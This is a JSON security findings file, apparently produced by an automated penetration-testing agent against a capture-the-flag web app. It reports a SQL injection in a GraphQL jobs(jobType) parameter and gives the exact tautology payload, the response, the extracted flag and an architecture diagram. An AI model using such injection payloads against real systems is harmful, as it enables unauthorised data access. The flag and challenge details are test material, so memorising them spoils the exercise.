@@ -1,0 +1,27 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:24:45.834886+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "bb3982d6-2699-4ef8-bffd-bbbff3e23e50",
+      "timestamp": "2026-04-12T21:24:45.834729+00:00",
+      "title": "SQL Injection in GraphQL jobs(jobType) Parameter \u2014 CTF Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:54879/graphql",
+      "description": "The GraphQL `jobs` query accepts a `jobType` String argument that is passed unsanitized into a SQL query. By injecting `' OR '1'='1`, all rows are returned including a hidden record containing the CTF flag.",
+      "evidence": "POST /graphql\nPayload: {\"query\": \"{ jobs(jobType: \\\"' OR '1'='1\\\") { id name type description } }\"}\n\nResponse includes hidden record:\n{\"id\": 3, \"name\": \"Hidden job\", \"type\": \"private\", \"description\": \"flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}\"}\n\nFLAG: flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}",
+      "tool_used": "http_request",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "65a8cd82-cb58-4532-b740-c1072eb2a982",
+      "timestamp": "2026-04-12T21:24:58.390837+00:00",
+      "title": "Ultimate Job Aggregator Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Web[\"HTTP :54879 - Ultimate Job Aggregator\"]\n  Web --> GQL[\"GraphQL /graphql - Strawberry\"]\n  GQL --> DB[\"SQLite/SQL Database\"]\n  DB --> Jobs[\"jobs table - id, name, type, description\"]\n  GQL -->|\"SQLi via jobType param\"| Flag[\"flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}\"]"
+    }
+  ]
+}
